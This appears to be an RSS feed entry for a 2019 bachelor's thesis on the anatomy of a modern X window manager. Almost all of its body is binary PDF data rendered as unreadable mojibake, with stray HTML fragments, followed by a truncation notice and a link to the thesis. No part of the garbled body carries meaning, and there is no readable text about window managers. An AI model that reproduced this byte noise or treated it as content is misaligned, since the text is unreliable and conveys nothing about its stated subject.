Ã„Å¸ÃºÃºuÂ¬pÂ¡aÃÂºÃ½ÃºÃ´yÃ°Ã½Ã·Ã±Ã±Ã±{Ã·Ã¬9wÃ®ÃœÆ’â€â€gÃÅ¾="Ã¿Ã­yjjÃªÃ«Ã—Â¯Â³Â³Â²rssYï¿½ï¿½ï¿½ï¿½Ã°Ã±Ã°DZÃ˜Ã¤Ã–Ãâ€ºgÃÅ“9p`Ã¿Â®Å¸ÃÂ¼iÃ“ï¿½Å½5Âª_Ã¯">Ã›ÂµÂ¯]Â£Fâ‚¬Â¯Â¯râ€¹XS3Ã‘Å“Âª/QÂªXq-5uC]=â„¢â€°Â©Â´Ãºâ€hÃ§E3+MA)â€šÃ¹	Ã¡Ã‰?Å¾Hâ€”â„¢Â­â€¢ÂµrÃ±XS31Ã¬Ã¢jÃ”VSÂ§zâ€°â€™Ã†ÃºÃ¢Â¯&lt;]]Ã‹7Â¨[Â·wï¿½Å¾#GÅ’Ëœ:yÃ²â€™Ã…â€¹wÃ®Ã˜qÃ¨Ã ÃÃ£Ã‡Å½]8Ã¾ÃÂ½{Â©Â©Â©YY,â€¡Ã¸Ã‘Ã”?~Ã´()1Ã±Ã˜Â±Â£Ã«Ã£Ã¢Ã¦,l2zÃ„ÃˆÅ¾ÃÂº7mÃœÂ¸nÂ­ZÃ•bbÃƒÃ‹â€¢Ã·tu
Â»Ã‚ÃœÃ‚ÃŒÃˆÃ˜@GW_[Ã‡XÃÃ€ÃœÃ˜DJNËœyBxÃ²_â„¢y"Ã†Â¡pÃ¦â€°Â¸ï¿½Ãµ
Ã„Ã…iÂ¨Â£+31â€¢VDÃ±ÃµÃ²Æ’VÂ·VÃ­&amp;ï¿½Â·nÃ‘Â²WÃ·Ã‡ï¿½Å¸3{Ã¶â€™Eâ€¹7oÃšt^9Ã¥~Ã†Â«WÃ¼;Ã¸Ë†Â§OÅ¾\Â¼xaÃ¿Â¾Â½Â«WÂ®;zTÂ§Ã¶Ã­â€º6jTÂ·fÂ­Â¨ÃˆÅ AÃ¾Ã¾&gt;Â¾&gt;Â¾Â¾^ÃnÃÃNvÃ¶Â¢oÂµÂ³Â²Â±Â±THÂ»ÃªË†Ã¾TZzÂ¢hÂ®sBxÂ¢:Ã«Å¸Ë†KQâ€
qYJÃ³&nbsp;Ã„Ã¥ÃªÃ¢Ã Ã¨Ã®Ã¢Ã¢Ã¯Ã­#ÃHP@`p`â„¢Jâ€˜ï¿½Ã«7hÃŸÂ¶MÃ¯Å¾Â½Â¦LÅ¡Â´uÃ³Ã¦sgÃÃœÂ»s'#Æ’Ã¼Ã°Â¯Â·oÃŸÃ¦Ã§Ã¥Ã§Ã¦Ã¦Å FÃ¾Ã•Â«WÂ©/^&lt;{Ã¶Ã¬Ã–Â­[Ã¶Ã¯_Â±|Ã¹Ã´Â©SÃ´Ã«WÂ¯vÃ­`Ã¿7ggÃ‘ï¿½ZÅ¡Ã‰Å’Ã´Ã´ï¿½Ãµ
d&amp;Â¦Ã–rKÃ‘â€“Å â€ Â´ÃˆÂ®KxÃ²5&amp;*Râ€“"Â®^Â¹â„¢Â¹â€°Â¾ï¿½4#Ã…Ã…Ã1Ã€Ã‡'",Â¼iÃ£Ã†cGï¿½Ã¾iÃ‰â€™Ã›Â¶ï¿½Ã¼ÃµÃ—GdddÂ¼~Ã½:33SÅ“Â¬Â¼Â¼&lt;Ã±â€¢aÆ’(RDÃ¸Ã¦MÃ–Ã‹Ã”Ã”))Â¢?qÃ¼Ã¸Â¡Æ’7oÃš4kÃ†Å’Ã½ÃºuhÃ›Â¶^Ã­:ÃÂ¥--MÃµÂµuÂ´JÂ©â€¢*V\Â£DI=-m3CcÃ‘Â§F(EÃ¹Ã¶Ã‚Ã•Â¿Â£Ã§Ã½^Ã†râ€¦i9=MmÃµÃ¢%Å +Â¦\EO_!â€œ9Ã›;â€	mÃ•Â¼Ã¹â‚¬Â¾}'Å’Â·pÃâ€š=Â»vï¿½&gt;uÃªÃ¢â€¦Ã—â€™â€™?~Ã¼ÃºuÂ«Ãˆ@â€â€˜Ã±ÃºÃ¡Æ’Â¢=ÃœÂ¾mÃ›Â²Â¥KÃ¦Ãï¿½;~Ã¬Ã˜Ã;Ã–Â«SÂ§JttDÃ¹0/7wkÂ¹â„¢Â±Â±rÃ­m]]M-Ã¥Ãš&amp;ÃºÂ¢ÂµÂ²ï¿½â€¹&gt;]ÂºOâ€¡Ã°â€Ã°DÃ…KÅ¡vbma)â€ Hfb*Â®a=-mmu
Ã±(Nï¿½Ã¸CÃ±~^ÃÂ±â€¢Â£Ã–Â«Ã—Âºyâ€¹Å¾ÃÂºÃËœ:mÃ¹O?mË†ï¿½ÃŸÂ¿o_RRRjÃªâ€¹Â·o	O&nbsp;hyÃ³Ã¦MJÃŠÆ’K.Ã¬ÃœÂ±cÃ¦Ã´Ã©ÃºÃ·Ã«Ã’Â©cÃ“Ã†ï¿½+EFâ€“Ã±Ã°Ã·Ã¶Ã±Ã³Ã¶Ã±pquÂ´QÃ¾Â¿Ã¶Â¥nvPÃˆ,â€;Ã‹YÃ›â€Ã°Ã¤Ã«Â»mÂ§p-Ã©Ã¦+â„¢\aÂ®Â¼Å¾Ã…Å¸Ã˜Ã›(wâ€ Ã²pug*4(8,$4&amp;*ÂªmÂ«Ã–ÃºÃ¶?vÃŒÂ¢~8xÃ°`Ã²Ã­[Ã©iiÃ¼Â»ÃŸÂ¤wâ€+Å“Ã¤+W8â€˜Ã¼Ã¶Ã¬Â·Ã§/Ã¬ÃÂ½wÃÂªUâ€œ'NlÃÂ²etTÂ¥Â²eÃŠxÂ¹Â»[Ã‹Ã¥fFÃ†Â¢â€”â€“Ã™Â´Â·&amp;!!&lt;Ã¹Ã¶Ã§Â¥HÃŒÅ RÃˆ,Ã„HZÃ‹-Ã½Â½}Â¢""Ã«Ã—Â©Ã“Â­Kâ€”Â¹sÃ¦Ã¬ÃœÂ±Ã½Ã”Ã‰â€œÃ—Â¯_OMMÃŸ&nbsp;Â¼Â¼Â¼Ã¼Â¼|iBâ‚¬o@~~~ffÂ¦Â´Ã¬Ã•+W.Å¾Â¿p`ÃŸï¿½Â¥â€¹â€”Lâ„¢4yÃˆÃ€ï¿½m[Âµ
/WÃÃ•Ã‰Ã‘Jtï¿½â€ â€ ZjÃªÃªÃ…KÃªÂ¨kË†Ã_4Ã£â€¦Ã³L&gt;Ãœâ€“vâ€ºÃ°Ã¤Ã›Ã˜ÃXJNl,Rf"Nâ„¢Â®â€ Â¦zâ€°â€™Å¡Â¥Ã”,LLï¿½Ã¬Ã¬||bÂ£Â¢ÂºvÃ©2iÃ‚â€,Ë†[Â»Ã¶ÃˆÃ¡ÃƒW._Â¾yÃ£FÃŠÃ½â€â€”A
Ã¿Ã‚Ã€Â·Ã ÃÂ»Ã´Ã´tÃ‘Ã®&gt;|xÃ«â€“-kVÂ­Å¾3sVÃŸ^}ÃšÂµnÃ“Â¤AÃƒj1Â±~ÃÃv66r3sSCC=-m
M]scÃ‘Qâ€“Â¶Â´*ÃœRâ€¡Ã¤â€Ã°Ã¤â€ºOÃ„&nbsp;YYÃˆÃ…Ã¨â„¢â€¹+_\Ã¿ÂºÅ¡ZÃ¢ÃºÃ®ÃªÃ¨$N_ï¿½ZÂµ:Â´mÃ›Â³[Ã·Â¡Æ’â€¡|?oÃÂ¦
Ã¬ÃŸÃ®Ã¬Â¹â€Ã»)Â¹Â¹yÃ¼ÃŸâ‚¬,Ã¥Ã²&amp;)Ã‡Å½]Â¶tÃ©â€Iâ€¡Ã”Â±mÂ»jÃ‘Â±ÃŠâ€¡â€¢	
)Ã¤Ã©ÃªÃ¦hgÂ§Ãœâ€˜Ã„RÂ¹#â€°ÃœÃŒ\!Â³ÃYÃ›â€Ã°Â¤Ë†Ã¬b\Â¸Å Â¸Ã²Ã…Ãµ_8â€™ÃbxÃƒBC+WÂ¬[Â¹rÃ­5Â»tÃ¬4aÃ¬Â¸XÂ¸eÃ³â€“â€¹Ã§/Â¤Â¥Â¥Ã³/|Ã•Ã²Ã²Ã³?~Å“xÃµÃªÃ¡Câ€¡â€“,ZÃ”Â·wÃ¯Â¦ï¿½UÂ©-Ãšy{Ã‘,ÃŠ,Dâ€¡Ã¨dg_Ã˜EÃ’JÅ¾PXEâ€Â³Â½Æ’Â£Â­ï¿½x"Â¾,Â¡AÃ
Ã«Ã–Ã«Ã–Ã¥Â»Ã±cÃ†Â­_wÃ±Ã‚Ã…Â¤Â½|Ã‰Ã½;Ã°Ã‰Ã‰Ã‰NKK{ÃºÃ¤Ã‰Â½{Ã·vÃ¯ÃšÂµfÃµÃªÂ¹Â³gÃ·Ã©Ã™Â³jllâ‚¬ï¿½Â¯heÃ†&amp;%JÂ©+Â®Â£Â¡Ã¬Ã®Ã¥fÃ¦Ã–â€“Ã’
Â±ÃŸÃ°Ã­9Ã’Å¡Ã‚â„¢â€“Ã”#Ã†96_uxÃ²Ã¡â€°â€Ã¶Â¤Ã¾Â£Â¤ÃŠÂ·Ã³Ë†Ãk-Â·_
s#qÃµÂµÂ´5Jâ€“Ã’*Â¥&amp;75Ã·ÃµÃ´ÂªT!Â¢IÃƒÃ†ÃƒYÂ±|Ã…Ã;&gt;Ã¶Ã‹Ã‘Â«WÂ®<zÃ¸0555333?Å¸mï¿½ï¿½ï¿½ï¿½@Â¥ege=xÃ°@Â´rÃ‡Å½ï¿½ï¿½ï¿½Å¸1mÃšÃ°Â¡c{vÃ«Ã–Â°^Â½Â â‚¬@g;{â€¦ÃŒbÃ´ÃµÂ¢ ÃÂ Å¾â€“Â¶â„¢Â¡Â±2<â€˜[Å Ã¹oâ€-Â¿Ã¨Ã½Ã’ï¿½kÂ¹Ã©%Ã‹â€š{4â€[0pâ€ºra]tÃ‚â€œwâ€“nÃ â€™n`="" +Â¯\p'â€”Â¸hÃ„Å¸kÃ—Ã‰Â·Å¡Å¸Ã¼!<c*36uâ€ 'Ãš:zÂ¥Ã”ÂµÃ”Ã”Ã="" ï¿½Ã„Ã¸zzeâ€kÃ‘Â¤Ã©Ã°!cÃ…wlÃ‘Ã‚Â·mÃ™zÃ¾ÃœÂ¹Â»wÃ¯Â¾|â„¢Ã†Ã¾;ï¿½ï¿½ï¿½ï¿½Â Ã¢d}Ã¹rÃ‚Ã¾}{wÂ­x1vÃŒËœmÃ›6jpÂ¿vï¿½â€˜Ã¡Ã¡^nÃ®Å½Â¥Ã­Â¤Ã¥1eÃ†&Ã¦Ã†&Â¢5ÃkÃ¿Ã¿Â¹ÃÂ·â€Å“~â€“Ã‚Ã™6rke,`j&31Æ’="" Â¥Ã˜Â¡0="">Ãº,Â«Ã£~ï¿½Ã¡â€°â€œï¿½Â½tâ€”%qUÃˆÃÃŒÃ…Ã Ëœâ€ºâ€¹'Ã²Ã²Ã±ÃŸÃ¼M^Ã¢*'ÃXZâ€°ï¿½Ã¼~4Å’MÃ…8Ë†Ã¿cÃ¥ÃªÃ¨Ã¤Ã«Ã¡YÂ©Bâ€8Â³Ã›ÂµÃ¯Ã›Â»ÃÃ´Â©Ã“Â¶mÃzÃ®ÃœÃ™â€Ã»)Ã™Å¸trÃ¿â‚¬wÃ¿Ãºâ€”hÃŒ/]ÂºÂ´yÃ“Â¦ysÃ¦0&nbsp;aÃ½ÃºÂ¡AAÂ¾^^&gt;Å¾Ã®..ÃŠ~PÃ±~ÃŸÃ¡Ã‚{XÅ Ã”Ã’&nbsp;Â®Ãºa}Ã¶Â¥qÂ¿Ã†Ã›v
Ã³Â¢?Â¬Â¡*Ã6Ã¹Ãƒï¿½;Ep]YÂ©Ã„â€°GÃ¥ecÂ©putÃ£_&gt;$4&amp;ÂªrÃ›VÂ­Â§NÅ¡Â¼..Ã®â€”#Â¿ÃœÂº}â€¹;w@EË†MÂ´Ã¡Â¢Ã¸Ã°Ã¡Ã7Â¯\Â¹rÃ¼Ã¨Ã‘Ã¥?Ã½$ÃºÃ´mÃ›Ã–Â¨RÃ…Ã‹ÃƒCfllÂ¨Â§gjhhfllfdlaÂ¢Å“jÂ¢ÃŒOlÂ¿â€°Ã›s&gt;XÃ†Ã¤Ãƒâ€¢LÂ¤HDtÃ½Ã–rÃ‹Ã‚â€ºMâ€Â½Â¿Mi';{7'gOW7owOQÃ¢â€°Ã¸OwgGg{iÃ¶Ã…ÃŸRÃ¾3&lt;9|xÃœÃšÂµÃ—Â®%Â½ÃÃˆÃˆÃÃÃÃ‹Ã»â€-nÃ“Ã’Ã“/'$Ã¬ÃœÂ¾cÃ–Å’â„¢Å¸7&lt;)CÃ±\Å’Æ’
o7w_O/?/o_OoÃ±.Â®Â®Å½Nâ€¦KÂ§Â¾ÃU
Ã†Â¶Â°
3â€“?,ï¿½Ã²mâ€-â€¦[â€¹q'Ã—@[Ã‡HO_flbif.Â®Â«ï¿½2A-â€º5<pï¿½85Ã±Ã«Ã—_Â¼pÃ¡ÃÃ{ï¿½>zÃ¶Ã¬Â«&nbsp;Ã€â€”Ã¨Ã‹&gt;xxÃ¶ÃŒÃ™ÃÂ»voÅ’ï¿½_Â´pÃ¡&nbsp;Å¡4j%zv;C]]]--Ã±(Ãš=3CÂ£Ã‚Ã°Ã¤Ãƒ5.Â¾ÃªMfCâ€¦ÃŒÃ‚Â¢Ã fsc3#cc}C]}-m=-mm]Ã‘Ã§Å ï¿½â„¢Ëœâ€°Â¾ÃÃÃ™Ã…ÃŸÃ›GÅ’ï¿½hxÃ‹â€”

Ã²Ã°Ã³Ã²Ã¶tussrâ€“Ã²Ã©Ã…?Â¹Ã«â€”Ã‚m5
SCÂ£Â²ï¿½eÅ¡5n:jÃ„Ã‘SÃŸÂºu3;+Ã«â€œÃ—Ã„Â§;)1qÃ·ÃÂ»Ã¦ÃŒÅ¡ÃÂ¶eÃ«Å "Ã„â€˜Â®Ã°Ã„Vae[Ã°Ã«.Â®b|Ã„Ã â€â€¦â€â€ â€¡â€“+XÃ†Ã—Ã“Ã‹Ã•Ã‘IÃ¼Ëœj1Ãˆb&lt;
Â´uÃ´Âµutt
uÃµÅ’tÃµï¿½ÃµÃ´Ã…â€¡â€¢Ã®â€œÃ¿Â¾â€™ÃŒâ€¡Â³zÂ¾ï¿½Ã°D|Å“Ã‚Ã°D|vÃ±Â©MÃ´
dÂ¦fÃ¢ÃŠâ€°Â®XÂ©qÃƒâ€ ï¿½;t5bÃ¤Å¡UÂ«Ã·Ã¯Ã›wÃªÃ—â€œIâ€°IÂ©Â©Â©Â¬â€šÃ¿-Â¢#{Ã±Ã¢Ã…Ã•+WÂ¶lÃ&lt;Ã®ÃœÃ±cÃ†Ã¶Ã­Ã•Â«~ï¿½ÂºaÂ¡Â¡Â¾Â¾Â¢Â§vÂ°Âµâ€¢VÂ®P6Â³2â„¢Â´fâ€¦Ã¨gÂ¿ï¿½ÂµMÂ¤U)l,Â¢IWËœÃ‹,LÃŒDÃ³nÂ¬o ym]
Mï¿½â€™Â¥J+^ÂªX1Ãµ%ÂµÃ”Ã”ÃµÂ´Â´Ã…Ã˜ZÃ›Ã¸zzâ€¢/SÂ©râ€¢Ã¨ËœÃ˜Â¨ÃŠâ€˜Ã¡Bâ€šâ€šÃ³';{iÃ‹'wÃ½bï¿½Ã…â€˜hÂ«iË†.Â»l`â„¢Ã¦MÅ¡Å½5jC||rÃ²Ã­ÃœÂ¿Â± FVVÃ–ÃµkÃ—Ã¶Ã®Ã3wÃ¶Å“Â¶-Ã›|Ã†Ã°DÂ¼â€šrâ€°ÃœR&lt;Ã·Ã±Ã°,\6ÂºbÂ¥UÂªÃ–ÂªVÂ½zâ€¢Âªâ€¢#+â€ â€	Ã²tsÃ—Å’Ã­â€š\H]Â½x	Âµb%4Jâ€Ã”,Ã˜â€ F[]C_KÃ›HOÃŸÃ”Ã€ÃÃŒÃˆXÅ¡â€™QÂ¸FÅ 4Â§Ã¥Ã›Ã˜Â¼X|"1Ã”bÃ€Â¥1â€”ÃŒqqp'ÂºBÃ¹Â°Ã¨JQM66dÃˆÃ¼Â¹Ã³Ã–Â­â€°;|Ã¨pÃŠÃ½â€Â¼<fÅ¾ï¿½ï¿½ï¿½ï¿½Ã€a^^Ãâ€œÃ‡o._Â¾Ã¼Ã³Å½ï¿½s&mÃ¾Â®sâ€”Ã† Ã„fuÃ¶ÃµÃ²â€“fmÃ¼Â¾Ã¾gÃ©Ã‚['Â¾Âµun="" 6Ã)\Å¡cÅ¡|"Ã­Â¡#ÂºzscÃ‘Ã£lÅ ÃÂ½Â¼Ã¸sâ€¦â€¢Â³Æ’cp@`â€¢ÃŠÃ‘ï¿½Ãª7hÃ“Â²uâ€¡Â¶Ã­:Â´iÃ›Âªyâ€¹ÃºuÃªÅ Å¾wÅ¡_Ã¡Ã¡Ã¢*Ã†Â­`Â±pÃ…ÃŸ="" oâ€Â·Ã­Â¨Â½Â¿mÂ§yÃ£&Â£fÅ’xÂ¿nÃÃâ€º7ÃdfÃ¦Â¿}Ã»is222Â¯^ÃÂµÃ³Ã§Ã™3gÂµiÃ‘Âªbâ€¦Ë†ÃuÃ›Å½Ã¸eÃ‹â€šÂ½â€¡mÃ­â€šÃ¼Âªde7mÃ˜Â¨sÃ»="Â¾Ã«ÃšÂµÃ‹wm[ÂµÂ®_Â»NÃ¥ÃˆÅ Â¡ÃeÃ½Â¼Â¼ï¿½Ã­Ã„{â„¢â„¢Å (UÃÂ¼Â¦Ã·Ã«ÃŠZâ€°Ãº`Â£olâ„¢â€Ã‚;Ã…">Ã¼Nâ€°1)Â¼Ã³Ã‹ÃŸÃ›Â§vÃµï¿½;t5lÃ„â€™Eâ€¹=Ã±Ã«Ãƒâ€¡ï¿½233Ã¹WÂ¾Â´woÃŸfggâ€°Ã¶955ÃµÃ©â€œÂ§Ã_Ã˜Â³kÃÂªâ€¢+'ï¿½Å¸ÃÂ¼IÃ“Â°ï¿½rÅ¾Â®nÂ¶
+C]=-5u}mâ„¢â€°iÃ¡$â€œ?Â¬ÃºÃ•Â­Ã’Ã¹â€¡%M
Ã‹Â¾`
gGWG'WOO?oÅ¸ÃŸ2~Ã¾!eâ€šBâ€šâ€šâ€¢7Ã¦â€
Â©Y5&amp;Â¶VÃµ
Ã«7Ã¨Ã˜Â®Ã½&nbsp;&amp;Å½?kÃ†ÃŒysÃ¦LÅ¸2uÃ´Ë†â€˜=ÂºuoTÂ¿ADXx&nbsp;Â¯Å¸â€”â€ºÂ»hï¿½â€¢iLÃ]''&lt;Ã‘Ã•Ãâ€™Ã‚i*â€š8Yâ€”^&lt;.NÃ¢Ã«Ã—Â¯s?ï¿½â€œÃ³Â§%-ï¿½â€™Å¸Å¸/Å¸={vÃ¾ÃœÂ¹-â€º6Oâ€º2ÂµUÂ³Ã¦Ã¢â‚¬?Wxb-Â·4+@Ã„RÂ¡\Ã¹Â¦
ÃµÃ«ÃgÃªÃ¤)?Ã¾Â°PÃ”Ã¬3Ã‡Å’ÃÂ¯OÃŸÃ¯:unÃ“Â²eÃƒzÃµÂ«DGGUË†Ë†Â¯P&gt;Â¬\pÃ™Ã Ã€2AAÃ¾Ã¾&gt;Â¾Â¾Å¾^Ã¢ï¿½Ã„0Ã%MÃ˜(\â€ºÃ·ÃƒEQÃ¾Â½NÃ¯Wâ€¢Â®|Â¸Â¸Â®4Ã½I&nbsp;8â€ :ÂºÃ¢Ã›g&nbsp;Â­+.KqÃ¹Ã•Â®VÂ³{Ã—nÃ¼Â°{Ã—Ã®S'O&amp;%&amp;Ã¾Ã¶Ã›oÃ©Ã©Ã©oÃÂ¼Â§â€¢Ã“Ã KxÃµÃªÃ•Æ’â€WÂ¯^=qÃ¼Ã¸Ãªâ€¢Â«Â¦Oï¿½&gt;|ÃˆÃÅ½Ã­ÃšGâ€ GÂ¸9:[Ã‰,LÂ¥Ã»)Jâ€Ã”Ã•Ã”232
ï¿½Ã²v	Ã‘Ã¢}eÃ¡Ã‰Ã»ï¿½bÂ¥)%â€“â€“Ã¦2iÃ›\SC#CcQÃºÃ¢â€°hWÃ…ï¿½â€°FÃ•ÃÃ…%Ã€Ã—Â·BÃ¹Ã²â€¢+V}}Â­Ãª5Å¡5nÃ’Â¦eÂ«Ã¶mÃšvÃ©Ã˜ItÃ½Ãƒâ€ =rÃ”â€Ã±Ã£Ã§ÃÅ¾Â³bÃ™Ã²ï¿½Ã±vnÃŸÂ±Ã»Ã§]Ã«Ã£Ã–Ã½Ã°Ã½â€šQ#FÂ¶mÃ•:*Â²Â¢tÅ’Â«Â£â€œ4ï¿½EÂ¼Ã»ÃŸOÃ„1â€¹Ã—lÃœ&nbsp;Ã¡ÃÃÆ’W._~Ã©Ã¢Ã…ÃŸÅ¾=KO
Ã´Â«Ã¬Ã¬l)6OÂ²Ã¾Å“Ã¸[Ã¥rÂ£Ã¯â€Ã«?yÃ¼Ã¤Ã¬â„¢3â€º7nÅ¡:yJÃ‹Â¦ÃÂ¥Â´Ã§Â³â€'Ã¢ÃƒÃ©Ã©Ã©Ãªâ€¹ÃÂ¬YÂ±CÃ›Â¶Ã£Ã‡Å’]ÂµbÃ¥Ã={Ã¶Ã¯Ã›/Ã†j]\ÃœOKâ€“|?oÃ¾ÃŒÃ©Ã“'Å½?tÃÃ Ã¾}ÃºÃ´Ã®Ã™Â«Ã»w]Ã›Â¶nÃÂ¬IÃ“Ã†
Ã”Â«]'Â¶rtDÃ¹Â°reCâ€šÂ½Ãœ&lt;Ã„+Ã›Ãˆâ€“fÃ¦fâ€ Ã†Ã¢Ã…
uÃµÃ„â€°Ã»piiï¿½â€”FÃ¹zÃƒÃ±AÃ„Â¹g\Â­x	ÃRj&amp;Â¦NÃ¶A~5Â«UÃ¯ÃŸÂ»Ã¯Â¬Ã©3~ZÂ²tÃ³Â¦ÃÃ¢Ã´%''Â¿xÃ¾&lt;â€¡Ã­Å’Ã Ã‹xÃ¶Ã´iBBÃ‚Â¾Â½Ã»DÃ»?Lâ€ºthÃ–Â¸IÃÂªÃ•Ã½Ã¼KÃ›Y[ÃˆE7jj`hÂ¬Â§/Ãº8â€¦Â¹â€¦Ã­NÅ“Â°Ã½jÃ¦Å“Ë†â€ ÂºpXÃ‘nÃªÃ¨ÃªjjÃ©Â¨khÂ«Â©â€¹Ã¦TÂ£d)-5uÃ‘Ã¯Ã›(ÃÃÅ¾aÂ¡Â¡ujÃ–lÃ–Â¸qâ€ºV-Â»vÃ©2bÃ˜Â°)'ÃÅ“1cÃÃ¼Ã¯WÂ­ZÂµiÃ£Ã†m[Â¶Ã®ÃœÂ¾Ã£Ã€Ã¾Ã½'Å½?wÃ¶Ã¬Â¥â€¹â€”.'\&gt;tÃ `ÃœÅ¡ÂµÃ“Â§LÃ½Â®SÃ§Ã¨JQAÃ¾&gt;Å¾RxÂ¢Â¼Ã“Ã§oâ€'Ã¢ËœÂ¥KÂ¼fÂ£Ãº
Â¸lÃ©RÃ±Â¾ï¿½=|Ã¾Ã›Ã³Ã_Â¼Ãxï¿½Ãµ&amp;Ã«Ãâ€º7Ã¢Ã‰Â«?'Ã¾67'Ã·ÃÂ»â€°Ã‡â€â€â€â€œÂ¿Å¾Å’_?yÃ¢Â¤MÅ¡V(&amp;Mâ€¢Â±Â³Â¶â€˜Ã–hÃ½Â´Ã°D|FÃ±Â»ÃŠPÂµuÅ“Ã¬Ã¬Â«TÅ½Ã®Ã–Â¥Ã‹ÃŒÃ©3vÃ®Ã˜!F)11Q&lt;Å¾&gt;uÃªÃ˜Ã‘Â£â€¡ÃœÂ»gï¿½Ã¸Ã³Ã¸ÃµÃ«Ã—Â¬^%Â®Ãƒ.Å“:yÃŠÂ¨â€˜#â€¡Ã”Â»gÂ¯Ã–Ã[Ã–Â­UÂ»ZLlÂ¥
Ã¢Ã˜KÃ›*ÃŒeÂ¦ÃŠISÂ­xâ€°RÃ…Å â€¹Â§Â£Â¡)mUcÂ¢o`nl"Â­"Ã¥'_KÃ„Ã·Å¸Ã›:KÂ¡Ë†Ã“-}.+â„¢â€¦Ã¸+wgÃ—ÃÃ Â²Ã¢Ã¬wÃ­Ãœe`Ã¿Ã¾Ã¢Â¬mË†ï¿½#yÃ¯Ã®=Ã®Ã¢â‚¬/Ã¡MffÃ‚Â¥K;Â¶o_Ã°Ã½â€šAÃ½Ã”Â©Y+Â¼\XÃN1ï¿½nÃ.Â¿/Ã‚ MÃ˜Ã¸ÃšÂ·8)Ã¼ Â¢Â­Â¶â€™Ã‰-LÃâ€Ã¨Ã¨(Ã—0Ã‘Ã“/Ëœ#Â¡gbhdciÃ¥Ã­Ã¡T)2Â²AÂ½z=Â»u:xÃ°Ã˜Ã‘Â£fÃËœÂ±vÃÅ¡];wÅ fÃ¿Ã¤Â¯Â¿&amp;&amp;%ÃÂ½sÃ§Ã¾Ã½Ã»)Ã·Ã¯?zÃ´Ã¨Ã©Ã“Â§Â¿Ã½Ã¶Ã›â€¹/R_Â¼HÂ¸â€Ã°Ã³ÃÅ¸Ã¸~AÂ¯Ã®=bÂ£*ÃºxxÂº99[YÃˆÂ¥ÃµN?mÃ…Ãâ€¹Ã–Ã—Ã–176	Ã´ÃµÂ«[Â«VÂ¯=Ã¦ÃÅ¾Â½ÃŸÂ¾â€â€â€kIIÃ—Â®]Â¿â€œ|'EÃ‘Â½Ã»Ã¢Ã‰Ã­[Â·Ã¿Â¬Ã„ÃŸ&gt;~Ã´Ã¸Ã¹Ã³Ã¢Ã±Ã¢â€¦Â»~ÃÂµdÃ±â€™Ãƒâ€ 7ÂªWÂ¿|HÂ¨Â¿Â·ï¿½Â§Â«â€ºÂ´Â®Bf!Ã¥Å¸0Ãšr3s=M-QÃÃ¶Ã•cÂ«Ã´Ã®Ã™sÃ¡â€šÅ½;Ã¶Ã¸Ã±Ã£Ã”Ã”Ã”Ã§ÃÅ¸â€¹A{Ã²Ã¤Ã‰Ã£Gï¿½&gt;|Ã¸ %Ã¥Ã¶Â­[Ã—Â®%]Â¹|Ã¹Ã´Ã©Ã“Â»wÃ­Å _Â¿rÃ…
qeÅ½1RÅ’dÂ§vÃ­[4mV5:6ÃˆÃÃŸÃÃ™EÅ¾ÃŒÃ„TÅ’â€ Â®Â¦â€“râ€¡Å¡ÃŸ'Å¸Ë†?Â´4Ã»wrÃ²~Ã¦â€°Ã­WÂ¼</fÅ¾ï¿½ï¿½ï¿½ï¿½Ã a^^Ã¾â€œÃ§o._Â¾Ã¼Ã³Å¾ï¿½s&mÃ¾Â®sâ€”Ã¦></pï¿½85Ã±Ã«Ã—_Â¼pÃ¡Ã¾Ã½{ï¿½></zÃ¸0555333?Ã¿mï¿½ï¿½ï¿½ï¿½@Â¥ege=xÃ°@Â´rÃ§Å¾ï¿½ï¿½ï¿½Ã¿1mÃºÃ°Â¡c{vÃ«Ã¶Â°^Â½Â â‚¬@g;{â€¦Ã¬bÃ´ÃµÂ¢></uÃ²Ã¤Ã½Âºuï¿½ï¿½mÂ©Â»Â³â€¹ï¿½Â¥Ã¢pwoosÃ«ho_vÂ°Ã®â€Ã¸Ã±Ã¢kâ„¢â€°Â£Â­ï¿½(Ã¢Ã¢â€œ></yÂ»nÃ´Ã°â€˜uÂ£c]ï¿½Ã¤fÃ¦fzÃº%?x;ÃµqÃºÃªÃ¢p-llm,â€'ï¿½ï¿½ï¿½ï¿½ï¿½Ã¢â€œ></zÃ¸pÃ¡></qttutÃ´Ã·Ã²Â©sÂ£Ã¦Ã ï¿½></pÂ x_â€¢â€¡Â±Â£goÅ¾8qÅ“Ã ËœqÂ£ztÃ­Ã¶Â´qÂ£Ã¨jq~^Ã¾Â¥v></p`Ã©Ã¢%Ã½Ã»Ã´kÃ¶Â¸iÃ­5Â«Ã¦Ã¤v(_Â¾lÂ 2Â¦Ã¯Â«rÃ£p)"26Âªrâ€¢Ã¨Ã¨jÃ¥Ãªâ€ (7vÃ¶Ã°tqpâ€nÂ¿â€™Ã®ÃŸÃ¹Â´â€¦Ã°ï¿½ï¿½ï¿½ï¿½@xÃ²aï¿½\Â¸Â¾Â¨â€¹Â½Â£ï¿½â€¡ghpÂ°hÃ¦Â«uÂ©rÂ¿nÃ½â€“Ã­Å¡Â·lÃ¾Â¼iÃ£Ã¦></tÃ°Ã Ã¿â€“,Ã¹Ã¥Ã°â€˜Ã°Ã¥ï¿½ï¿½ï¿½ï¿½Â¨`xâ€™â€”â€”wÃ¥Ãªâ€¢uqÃ«Ã¦Å¾Ã½Â¼qâ€œ2Â¾Ã¾Â¢wsrÃ²></q{Å¾4kÃ¼dÃ´Ë†Ã«Ã—Â­Â»yÃ³Ã¦â€ºÃ¬Ã¬Ã¼Ã¼Ã¼oÃ«"222Â®^Â½Â²kÃ§Ã¯Â³gÃ®jÃ³bÂºmâ€¡Ã°ï¿½ï¿½ï¿½ï¿½ï¿½|aÃ¿Ã¬Ã¬â€œfï¿½â€ºÅ“></qÂ´Âµâ€œÂ¢></yÃ²Ã¤Ã¦Ã­gÃ¯Å“Ã¹Â·wÃ¯Å¾Ã­Ã»Â·nÃ¹ÂºyÃ³Â¦ÃµqÃ«Ã¶Ã¥Ã¥Â­_Â·nc|Ã¼Ã¦Ã¸></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cs.ru.nl/bachelors-theses/2019/Max_van_Deurzen___4581903___The_anatomy_of_the_modern_window_manager_-_a_case_study_for_X_in_an_Agile_manner.pdf">https://www.cs.ru.nl/bachelors-theses/2019/Max_van_Deurzen___4581903___The_anatomy_of_the_modern_window_manager_-_a_case_study_for_X_in_an_Agile_manner.pdf</a></em></p>]]>
            </description>
            <link>https://www.cs.ru.nl/bachelors-theses/2019/Max_van_Deurzen___4581903___The_anatomy_of_the_modern_window_manager_-_a_case_study_for_X_in_an_Agile_manner.pdf</link>
